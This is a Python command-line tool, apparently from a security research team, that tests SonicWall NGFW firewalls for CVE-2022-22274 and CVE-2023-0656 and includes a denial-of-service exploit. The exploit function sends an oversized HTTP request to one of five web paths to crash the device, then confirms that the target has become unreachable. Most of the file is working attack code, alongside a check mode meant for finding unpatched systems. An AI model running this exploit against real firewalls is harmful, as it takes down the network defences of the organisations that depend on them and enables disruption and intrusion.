#!/usr/bin/env python3
#
# Vulnerability test and DoS exploit for
# SonicWall NGFW CVE-2022-22274 & CVE-2023-0656
# by Bishop Fox Team X

import sys
import time
import re
import socket
import ssl
import warnings

import argparse


def check_header(host, port):
    # Check for SonicWall header
    data = b"GET / HTTP/1.1\r\n\r\n"
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            context = ssl.SSLContext()
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.send(data)
                resp = ssock.recv(256)
        if b"Server: SonicWALL\r\n" in resp:
            print("[+] Confirmed target is running SonicOS")
            return True
        else:
            print("[-] Failed to confirm SonicOS on the target")
            return False
    except:
        print("[-] Failed to connect")
        return False


def test(host, port, path):
    # Test for vulnerability at an arbitrary path
    data = b"GET " + path + b"A" * 0x400 + b" HTTP/1.1\r\n\r\n"
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            context = ssl.SSLContext()
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.send(data)
                resp = ssock.recv(1024)
        if resp and re.match(r"HTTP/\d\.?\d? 302 Found", resp[:18].decode()):
            print("[+] Target looks vulnerable! (redirected)")
            return True
        elif not resp:
            print("[-] Target appears to be patched (empty response)")
            return True
        else:
            try:
                status = resp.decode().split(" ", 2)[1]
                print(f"[-] Target does not appear to be affected (HTTP {status})")
            except:
                print("[-] Target does not appear to be affected")
            return True
    except:
        print("[-] Failed to connect")
        return False


def exploit(host, port, path):
    # Trigger crash
    print(f"[*] Triggering exploit at {path.decode()}")
    data = b"GET " + path + b"A" * 0x400 + b" HTTP/1.1" + b"B" * 0x2000 + b"\r\n\r\n"
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            context = ssl.SSLContext()
            context.verify_mode = ssl.CERT_NONE
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                ssock.send(data)
    except:
        print("[-] Failed to connect")
        sys.exit(0)

    # Check availability
    time.sleep(5)
    try:
        socket.create_connection((host, port), timeout=5)
        print("[-] Exploit failed (target responded)")
    except:
        print("[+] Exploit succeeded! (target unavailable)")


def main():
    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-t",
        "--test",
        action="store_true",
        help="safely test for vulnerability (default action)",
    )
    parser.add_argument(
        "-x",
        "--exploit",
        type=int,
        choices=range(1, 6),
        help="exploit the target (trigger a crash). 1=/resources/ 2=// 3=/atp/ 4=/stats/ 5=/Security_Services",
    )
    parser.add_argument(
        "-s",
        "--skip-header-check",
        action="store_true",
        help="skip initial check for SonicWALL response header",
    )
    parser.add_argument(
        "target",
        help="hostname[:port] (port defaults to 443)",
    )
    args = parser.parse_args()
    if not args.test and not args.exploit:
        args.test = True

    # Ignore SSL deprecation warnings
    warnings.filterwarnings("ignore", category=DeprecationWarning)

    # Parse target details
    port = 443
    parts = args.target.count(":")
    if parts > 1:
        print("[!] Invalid target")
        sys.exit(1)
    elif parts:
        host, port = args.target.rsplit(":", 1)
        port = int(port)
    else:
        host = args.target
    print(f"[*] Checking https://{host}:{port}")

    # Perform header check
    if not args.skip_header_check:
        if not check_header(host, port):
            sys.exit(0)

    # Test vulnerabilities
    if args.test:
        print("[*] Testing CVE-2022-22274 at /resources/")
        if not test(host, port, b"/resources/"):
            sys.exit(0)
        print("[*] Testing CVE-2022-22274 at //")
        if not test(host, port, b"//"):
            sys.exit(0)
        print("[*] Testing CVE-2022-22274 at /atp/")
        if not test(host, port, b"/atp/"):
            sys.exit(0)
        print("[*] Testing CVE-2023-0656 at /stats/")
        if not test(host, port, b"/stats/"):
            sys.exit(0)
        print("[*] Testing CVE-2023-0656 at /Security_Services")
        if not test(host, port, b"/Security_Services"):
            sys.exit(0)

    # Exploit vulnerability
    if args.exploit:
        paths = [b"/resources/", b"//", b"/atp/", b"/stats/", b"/Security_Services"]
        exploit(host, port, paths[args.exploit - 1])


if __name__ == "__main__":
    main()
